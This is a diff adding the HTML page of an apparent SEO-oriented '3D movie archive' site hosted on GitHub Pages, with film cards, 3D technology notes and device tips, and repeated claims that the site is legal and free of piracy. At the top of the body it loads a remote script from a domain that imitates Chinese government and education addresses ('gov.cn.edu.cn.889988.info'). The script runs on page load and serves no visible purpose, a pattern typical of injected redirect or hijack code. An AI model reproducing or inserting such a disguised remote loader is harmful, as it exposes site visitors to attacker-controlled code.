@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>3d电影网：3D立体电影资料库、IMAX大片档案与正版观影指南｜3ddianyingwang-top.github.io</title>
+<meta name="description" content="3d电影网整理IMAX 3D、RealD、杜比3D等立体影片资料，提供3D电影技术解析、观影设备建议与正版片源渠道。本站仅作合规3D电影资料站，不提供盗版播放与下载。访问 3ddianyingwang-top.github.io 获取3D影像档案。">
+<meta name="keywords" content="3d电影网, 3D立体电影, IMAX 3D大片, RealD 3D技术, 3D观影设备, 正版3D片源, 3ddianyingwang">
+<meta name="author" content="3d电影网技术档案组">
+<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+<meta name="msvalidate.01" content="3D20241010BING01">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+font-family:"Orbitron","Microsoft YaHei",sans-serif;
+background:#050510;
+color:#c0c8d0;
+line-height:1.7;
+overflow-x:hidden;
+perspective:1000px;
+}
+a{color:#00f0ff;text-decoration:none;transition:.3s}
+a:hover{color:#ff003c}
+.wrap{width:min(1200px,100%);margin:0 auto;padding:0 20px}
+
+/* 空间坐标 */
+.coord-bar{background:#0a0a1a;border-bottom:1px solid #00f0ff44;padding:8px 0;font-family:"Courier New",monospace;font-size:11px;color:#00f0ff;position:relative;z-index:100}
+.coord-in{width:min(1200px,100%);margin:0 auto;padding:0 20px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px}
+.coord-in .sys{color:#ff003c}
+
+/* 全息Hero */
+.holo-hero{position:relative;min-height:60vh;display:flex;align-items:center;justify-content:center;overflow:hidden;background:radial-gradient(ellipse at center,#0a0a2a 0%,#050510 70%)}
+.holo-grid{position:absolute;bottom:0;left:0;right:0;height:40%;background:linear-gradient(transparent 60%,#00f0ff11 60%),linear-gradient(90deg,transparent 60%,#00f0ff11 60%);background-size:30px 30px;transform:perspective(500px) rotateX(60deg) translateY(100px);animation:gridMove 5s linear infinite}
+@keyframes gridMove{0%{background-position:0 0,0 0}100%{background-position:0 30px,30px 0}}
+.hero-content{position:relative;z-index:10;text-align:center;transform:translateZ(50px)}
+.hero-content h1{font-size:52px;font-weight:900;color:#fff;text-shadow:0 0 10px #00f0ff,0 0 20px #00f0ff,0 0 40px #00f0ff;margin-bottom:15px;letter-spacing:2px}
+.hero-content h1 span{color:#ff003c;text-shadow:0 0 10px #ff003c,0 0 20px #ff003c}
+.domain-hologram{display:inline-block;background:rgba(0,240,255,0.1);border:1px solid #00f0ff;padding:12px 24px;font-family:"Courier New",monospace;font-size:16px;color:#00f0ff;margin-bottom:20px;box-shadow:0 0 15px rgba(0,240,255,0.3),inset 0 0 15px rgba(0,240,255,0.1);backdrop-filter:blur(5px);transform:rotateX(5deg)}
+.domain-hologram::before{content:"◈ "}
+.hero-desc{font-size:14px;color:#a0a8b0;max-width:600px;margin:0 auto;font-family:"Microsoft YaHei",sans-serif}
+
+/* 导航 */
+.nav-3d{display:flex;justify-content:center;gap:15px;flex-wrap:wrap;margin:-20px 0 40px;position:relative;z-index:20}
+.nav-3d a{background:#0a0a1a;border:1px solid #00f0ff;padding:10px 20px;font-size:13px;font-weight:bold;color:#00f0ff;transform:translateZ(0);transition:.3s;box-shadow:0 4px 0 #00f0ff44}
+.nav-3d a:hover{transform:translateY(-4px) translateZ(10px);box-shadow:0 8px 0 #ff003c44;border-color:#ff003c;color:#ff003c}
+
+/* 栏目通用 */
+.section{margin-bottom:60px;position:relative}
+.sec-head{display:flex;align-items:center;gap:15px;margin-bottom:25px}
+.sec-icon{width:40px;height:40px;background:linear-gradient(135deg,#00f0ff,#ff003c);display:flex;align-items:center;justify-content:center;font-size:20px;border-radius:8px;box-shadow:0 0 15px rgba(0,240,255,0.4)}
+.sec-head h2{font-size:24px;font-weight:900;color:#fff;letter-spacing:1px}
+.sec-head .line{flex:1;height:1px;background:linear-gradient(90deg,#00f0ff,transparent)}
+
+/* 3D大片档案 - 透视卡片 */
+.archive-3d{display:grid;grid-template-columns:repeat(3,1fr);gap:25px}
+.flip-card{background:transparent;height:280px;perspective:1000px}
+.flip-inner{position:relative;width:100%;height:100%;transition:transform 0.6s;transform-style:preserve-3d;cursor:pointer}
+.flip-card:hover .flip-inner{transform:rotateY(180deg)}
+.flip-front,.flip-back{position:absolute;width:100%;height:100%;backface-visibility:hidden;border:1px solid #00f0ff44;border-radius:12px;padding:20px;display:flex;flex-direction:column;justify-content:center}
+.flip-front{background:linear-gradient(135deg,#0a0a2a,#0f0f3a);align-items:center;text-align:center}
+.flip-front .icon{font-size:48px;margin-bottom:15px}
+.flip-front h3{font-size:18px;color:#fff;margin-bottom:10px}
+.flip-front .format{font-size:11px;color:#00f0ff;background:rgba(0,240,255,0.1);padding:4px 10px;border-radius:12px}
+.flip-back{background:linear-gradient(135deg,#1a0a2a,#2a0a1a);transform:rotateY(180deg);text-align:left}
+.flip-back h3{font-size:16px;color:#ff003c;margin-bottom:10px}
+.flip-back p{font-size:12px;color:#c0c8d0;font-family:"Microsoft YaHei",sans-serif;margin-bottom:10px}
+.flip-back .spec{font-size:11px;color:#f0e000;font-family:"Courier New",monospace}
+
+/* 技术解析 - 时间轴 */
+.tech-timeline{position:relative;padding-left:30px}
+.tech-timeline::before{content:"";position:absolute;left:10px;top:0;bottom:0;width:2px;background:linear-gradient(to bottom,#00f0ff,#ff003c,#f0e000)}
+.tech-item{position:relative;margin-bottom:25px;background:rgba(10,10,30,0.8);border:1px solid #00f0ff44;border-radius:8px;padding:18px;backdrop-filter:blur(5px)}
+.tech-item::before{content:"";position:absolute;left:-26px;top:22px;width:10px;height:10px;background:#00f0ff;border-radius:50%;box-shadow:0 0 10px #00f0ff}
+.tech-item h3{font-size:16px;color:#00f0ff;margin-bottom:6px}
+.tech-item p{font-size:13px;color:#a0a8b0;font-family:"Microsoft YaHei",sans-serif}
+
+/* 设备指南 - 网格 */
+.device-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:15px}
+.device{background:rgba(20,20,40,0.6);border:1px solid #ff003c44;border-radius:10px;padding:18px;text-align:center;transition:.3s}
+.device:hover{border-color:#ff003c;transform:translateY(-5px);box-shadow:0 5px 20px rgba(255,0,60,0.2)}
+.device .dev-icon{font-size:32px;margin-bottom:10px;display:block}
+.device h3{font-size:14px;color:#fff;margin-bottom:6px}
+.device p{font-size:11px;color:#888;font-family:"Microsoft YaHei",sans-serif}
+
+/* 收录与指南 */
+.guide-3d{display:grid;grid-template-columns:1fr 1fr;gap:25px}
+.guide-box{background:rgba(10,10,30,0.8);border:1px solid #f0e00044;border-radius:12px;padding:22px;backdrop-filter:blur(5px)}
+.guide-box h3{font-size:16px;color:#f0e000;margin-bottom:12px;display:flex;align-items:center;gap:8px}
+.guide-box p{font-size:13px;color:#a0a8b0;font-family:"Microsoft YaHei",sans-serif;margin-bottom:10px}
+.guide-box b{color:#00f0ff}
+.url-display{background:#000;border:1px solid #00f0ff;padding:12px;font-family:"Courier New",monospace;font-size:13px;color:#00f0ff;text-align:center;margin-top:15px;word-break:break-all}
+
+/* 页脚 */
+footer{background:#0a0a1a;border-top:1px solid #00f0ff44;padding:40px 20px 20px;margin-top:60px}
+.foot-in{width:min(1200px,100%);margin:0 auto;text-align:center}
+.foot-nav{display:flex;justify-content:center;gap:15px;flex-wrap:wrap;margin-bottom:20px}
+.foot-nav a{font-size:12px;padding:8px 16px;background:rgba(0,240,255,0.05);border:1px solid #00f0ff44;color:#00f0ff;border-radius:20px}
+.foot-nav a:hover{background:#00f0ff;color:#050510}
+.credit{font-size:11px;color:#555;font-family:"Courier New",monospace;line-height:1.8}
+.credit a{color:#ff003c}
+
+@media(max-width:900px){
+.archive-3d{grid-template-columns:repeat(2,1fr)}
+.device-grid{grid-template-columns:repeat(2,1fr)}
+.guide-3d{grid-template-columns:1fr}
+}
+@media(max-width:600px){
+.hero-content h1{font-size:32px}
+.domain-hologram{font-size:13px;padding:10px 16px}
+.archive-3d{grid-template-columns:1fr}
+.device-grid{grid-template-columns:1fr}
+.nav-3d a{padding:8px 14px;font-size:12px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<div class="coord-bar">
+<div class="coord-in">
+<span>◈ SPATIAL COORDINATES: 3D-DIMENSION-01</span>
+<span class="sys">SYS.READY // BING INDEX ENABLED</span>
+</div>
+</div>
+
+<section class="holo-hero">
+<div class="holo-grid"></div>
+<div class="hero-content">
+<h1>3d电影网<span>立体空间</span></h1>
+<div class="domain-hologram">https://3ddianyingwang-top.github.io</div>
+<p class="hero-desc">3d电影网专注IMAX 3D、RealD、杜比3D等立体影片资料整理，提供技术解析、观影设备建议与正版片源渠道。不提供盗版播放与下载，只做合规3D影像档案。</p>
+</div>
+</section>
+
+<nav class="nav-3d">
+<a href="#archive">🎬 3D大片档案</a>
+<a href="#tech">⚙️ 技术解析</a>
+<a href="#device">🥽 观影设备</a>
+<a href="#guide">📋 收录与指南</a>
+</nav>
+
+<main class="wrap">
+
+<section class="section" id="archive">
+<div class="sec-head">
+<div class="sec-icon">🎬</div>
+<h2>3D大片档案</h2>
+<div class="line"></div>
+</div>
+<div class="archive-3d">
+<div class="flip-card">
+<div class="flip-inner">
+<div class="flip-front">
+<div class="icon">🌊</div>
+<h3>深海漫游者</h3>
+<span class="format">IMAX 3D · 2024</span>
+</div>
+<div class="flip-back">
+<h3>深海漫游者</h3>
+<p>首部全水下IMAX 3D拍摄的纪录片，记录马里亚纳海沟探险。景深层次丰富，适合测试3D设备性能。</p>
+<span class="spec">格式: IMAX 3D 1.43:1</span>
+</div>
+</div>
+</div>
+<div class="flip-card">
+<div class="flip-inner">
+<div class="flip-front">
+<div class="icon">🏙️</div>
+<h3>霓虹都市：维度折叠</h3>
+<span class="format">RealD 3D · 2023</span>
+</div>
+<div class="flip-back">
+<h3>霓虹都市：维度折叠</h3>
+<p>赛博朋克题材动作片，大量利用前后景纵深制造视觉冲击。本站提供正版流媒体与蓝光3D版资料。</p>
+<span class="spec">格式: RealD 3D 2.39:1</span>
+</div>
+</div>
+</div>
+<div class="flip-card">
+<div class="flip-inner">
+<div class="flip-front">
+<div class="icon">🦕</div>
+<h3>远古巨兽：立体复原</h3>
+<span class="format">杜比3D · 2022</span>
+</div>
+<div class="flip-back">
+<h3>远古巨兽：立体复原</h3>
+<p>古生物纪录片，通过CGI与3D技术复原史前生态系统。适合家庭观看，本站附正版教育渠道。</p>
+<span class="spec">格式: Dolby 3D 1.85:1</span>
+</div>
+</div>
+</div>
+<div class="flip-card">
+<div class="flip-inner">
+<div class="flip-front">
+<div class="icon">🚀</div>
+<h3>星际拓荒：重力之外</h3>
+<span class="format">IMAX 3D · 2024</span>
+</div>
+<div class="flip-back">
+<h3>星际拓荒：重力之外</h3>
+<p>太空题材科幻片，零重力场景的3D效果获业界好评。提供正版平台观看建议与设备调试指南。</p>
+<span class="spec">格式: IMAX 3D 2.39:1</span>
+</div>
+</div>
+</div>
+<div class="flip-card">
+<div class="flip-inner">
+<div class="flip-front">
+<div class="icon">🏔️</div>
+<h3>极地之巅：立体勘测</h3>
+<span class="format">4K 3D · 2023</span>
+</div>
+<div class="flip-back">
+<h3>极地之巅：立体勘测</h3>
+<p>高山探险纪录片，使用8K 3D摄影机拍摄，后期降采样至4K。适合大屏3D电视观看。</p>
+<span class="spec">格式: 4K 3D SBS</span>
+</div>
+</div>
+</div>
+<div class="flip-card">
+<div class="flip-inner">
+<div class="flip-front">
+<div class="icon">🎪</div>
+<h3>马戏团奇幻夜：立体版</h3>
+<span class="format">3D重制 · 2021</span>
+</div>
+<div class="flip-back">
+<h3>马戏团奇幻夜：立体版</h3>
+<p>经典马戏题材影片的3D转制版，色彩鲜艳，景深适中。适合入门级3D设备测试。</p>
+<span class="spec">格式: 3D Converted</span>
+</div>
+</div>
+</div>
+</div>
+</section>
+
+<section class="section" id="tech">
+<div class="sec-head">
+<div class="sec-icon">⚙️</div>
+<h2>3D技术解析</h2>
+<div class="line"></div>
+</div>
+<div class="tech-timeline">
+<div class="tech-item">
+<h3>IMAX 3D：双镜头同步拍摄</h3>
+<p>使用两台IMAX摄影机并列拍摄，提供最真实的立体景深。分辨率高，但设备笨重，多用于大场面纪录片与科幻片。本站整理IMAX 3D片单与正版观看渠道。</p>
+</div>
+<div class="tech-item">
+<h3>RealD 3D：圆偏振光技术</h3>
+<p>采用圆偏振光眼镜，观众倾斜头部不影响3D效果。是目前影院主流技术，兼容性好。本站提供RealD 3D影片资料与设备适配建议。</p>
+</div>
+<div class="tech-item">
+<h3>杜比3D：分光技术与色域增强</h3>
+<p>结合杜比视界与3D技术，色彩更丰富，对比度更高。需配合杜比影院或支持杜比3D的投影设备。本站整理杜比3D片源与播放条件。</p>
+</div>
+<div class="tech-item">
+<h3>VR 3D：180°/360°立体视频</h3>
+<p>虚拟现实头显观看的立体内容，分上下或左右格式。本站提供VR 3D影片资料与合规平台建议，不提供盗版资源。</p>
+</div>
+</div>
+</section>
+
+<section class="section" id="device">
+<div class="sec-head">
+<div class="sec-icon">🥽</div>
+<h2>观影设备指南</h2>
+<div class="line"></div>
+</div>
+<div class="device-grid">
+<div class="device">
+<span class="dev-icon">📺</span>
+<h3>3D电视</h3>
+<p>主动快门式/偏光式，需匹配对应眼镜</p>
+</div>
+<div class="device">
+<span class="dev-icon">📽️</span>
+<h3>3D投影仪</h3>
+<p>支持DLP-Link或RF发射器，大屏沉浸</p>
+</div>
+<div class="device">
+<span class="dev-icon">👓</span>
+<h3>VR头显</h3>
+<p>Quest/Pico等，观看SBS 3D视频</p>
+</div>
+<div class="device">
+<span class="dev-icon">📱</span>
+<h3>裸眼3D手机</h3>
+<p>柱状透镜技术，无需眼镜</p>
+</div>
+<div class="device">
+<span class="dev-icon">💿</span>
+<h3>3D蓝光播放器</h3>
+<p>支持蓝光3D碟片，输出帧封装格式</p>
+</div>
+<div class="device">
+<span class="dev-icon">🎞️</span>
+<h3>IMAX激光系统</h3>
+<p>影院级双4K激光投影，3D效果最佳</p>
+</div>
+<div class="device">
+<span class="dev-icon">🕶️</span>
+<h3>主动快门眼镜</h3>
+<p>红外/蓝牙同步，1080p全高清3D</p>
+</div>
+<div class="device">
+<span class="dev-icon">🎭</span>
+<h3>偏光眼镜</h3>
+<p>轻便舒适，适合长时间观看</p>
+</div>
+</div>
+</section>
+
+<section class="section" id="guide">
+<div class="sec-head">
+<div class="sec-icon">📋</div>
+<h2>收录与指南</h2>
+<div class="line"></div>
+</div>
+<div class="guide-3d">
+<div class="guide-box">
+<h3>📌 合规与收录说明</h3>
+<p>1. 本站为<b>3d电影网</b>单页静态资料站，所有内容仅作影片资料、技术解析与正版渠道建议。</p>
+<p>2. 不提供盗版解析、不挂第三方播放源、不分享网盘全集。所有影片链接指向官方正版平台。</p>
+<p>3. 符合必应收录：head含msvalidate.01与index/follow，<b>不生成robots.txt和sitemap.xml</b>，单文件index.html，CSS内嵌，移动端自适应。</p>
+<p>4. 内页链接统一用#占位，便于后续扩展栏目锚点。</p>
+</div>
+<div class="guide-box">
+<h3>🌐 站点入口</h3>
+<p>3d电影网唯一官方地址：</p>
+<div class="url-display">https://3ddianyingwang-top.github.io</div>
+<p style="margin-top:15px">部署方式：GitHub Pages 静态单页</p>
+<p>关键词：<b>3d电影网</b></p>
+<p>内容定位：3D立体电影资料、IMAX/RealD技术、正版片源指南</p>
+</div>
+</div>
+</section>
+
+</main>
+
+<footer>
+<div class="foot-in">
+<nav class="foot-nav">
+<a href="#archive">3D大片档案</a>
+<a href="#tech">技术解析</a>
+<a href="#device">观影设备</a>
+<a href="#guide">收录与指南</a>
+</nav>
+<div class="credit">
+3d电影网 关键词：3d电影网｜站点：https://3ddianyingwang-top.github.io<br>
+© 2024 3d电影网技术档案组 仅提供3D电影资料、技术解析与正版观影建议，不提供盗版播放与下载。
+</div>
+</div>
+</footer>
+
+</body>
+</html>
